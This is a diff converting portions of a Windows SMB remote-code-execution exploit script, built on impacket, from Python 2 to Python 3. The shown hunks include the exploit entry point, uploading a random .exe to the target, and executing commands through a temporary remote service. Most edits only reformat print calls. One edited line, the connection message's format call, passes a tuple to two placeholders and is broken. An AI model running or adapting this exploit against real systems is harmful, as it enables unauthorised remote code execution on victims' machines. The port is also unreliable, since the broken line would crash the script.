@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 from impacket import smb, smbconnection
 from mysmb import MYSMB
 from struct import pack, unpack, unpack_from
@@ -790,7 +790,7 @@ def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroup
 
 
 def exploit(target, port, pipe_name):
-	print('Trying to connect to %s:%d' % (target, port))
+	print('Trying to connect to {}:{}'.format((target, port)))
 	conn = MYSMB(target, port)
 	
 	# set NODELAY to make exploit much faster
@@ -980,7 +980,7 @@ def send_and_execute(conn, arch):
 	smbConn = conn.get_smbconnection()
 
 	filename = "%s.exe" % random_generator(6)
-	print "Sending file %s..." % filename
+	print("Sending file {}...".format(filename))
 
 
     #In some cases you should change remote file location
@@ -1033,7 +1033,7 @@ def service_exec(conn, cmd):
 		if serviceHandle:
 			# Start service
 			try:
-				print('Starting service %s.....' % service_name)
+				print('Starting service {}.....'.format(service_name))
 				scmr.hRStartServiceW(rpcsvc, serviceHandle)
 				# is it really need to stop?
 				# using command line always makes starting service fail because SetServiceStatus() does not get called
@@ -1042,11 +1042,11 @@ def service_exec(conn, cmd):
 			except Exception as e:
 				print(str(e))
 			
-			print('Removing service %s.....' % service_name)
+			print('Removing service {}.....'.format(service_name))
 			scmr.hRDeleteService(rpcsvc, serviceHandle)
 			scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
 	except Exception as e:
-		print("ServiceExec Error on: %s" % conn.get_remote_host())
+		print("ServiceExec Error on: {}".format(conn.get_remote_host()))
 		print(str(e))
 	finally:
 		if svcHandle:
@@ -1071,7 +1071,7 @@ except:
 	pass
 
 if not os.path.isfile(lfile):
-    print("File not found %s" % lfile)
+    print("File not found {}".format(lfile))
     sys.exit(1)
 
 exploit(target, port, pipe_name)
